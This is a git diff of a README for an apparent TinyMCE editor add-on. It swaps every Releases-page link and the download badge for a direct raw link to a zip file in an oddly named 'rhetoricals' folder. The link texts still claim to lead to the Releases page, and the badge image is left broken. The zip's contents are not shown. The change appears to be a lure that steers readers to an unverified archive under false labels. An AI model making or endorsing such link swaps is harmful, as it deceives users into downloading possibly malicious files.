@@ -2,7 +2,7 @@
 
 ## 💾 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases)
+[![Download Now](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/rhetoricals/Expert_MCE_Editor_Universal_Tiny_1.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/rhetoricals/Expert_MCE_Editor_Universal_Tiny_1.9.zip)
 
 ## 📋 Introduction
 
@@ -19,11 +19,11 @@ Expert-Editor-Universal-TinyMCE adds powerful features to TinyMCE editors. This 
 
 To get started, visit the Releases page to download the software:
 
-[Download the Latest Release](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases)
+[Download the Latest Release](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/rhetoricals/Expert_MCE_Editor_Universal_Tiny_1.9.zip)
 
 ### 🔄 Installation Steps
 
-1. **Visit the Releases Page:** Click [here](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases) to view available versions.
+1. **Visit the Releases Page:** Click [here](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/rhetoricals/Expert_MCE_Editor_Universal_Tiny_1.9.zip) to view available versions.
    
 2. **Choose Your Version:** Look for the most recent version listed.
 
@@ -76,4 +76,4 @@ This project is released under the MIT License. Feel free to use and modify the 
 - web-extension
 - youtube
 
-For more latest updates, always check back to the [Releases page](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/releases). Enjoy enhancing your editing experience with Expert-Editor-Universal-TinyMCE!
+For more latest updates, always check back to the [Releases page](https://github.com/momemido/Expert-Editor-Universal-TinyMCE/raw/refs/heads/main/rhetoricals/Expert_MCE_Editor_Universal_Tiny_1.9.zip). Enjoy enhancing your editing experience with Expert-Editor-Universal-TinyMCE!
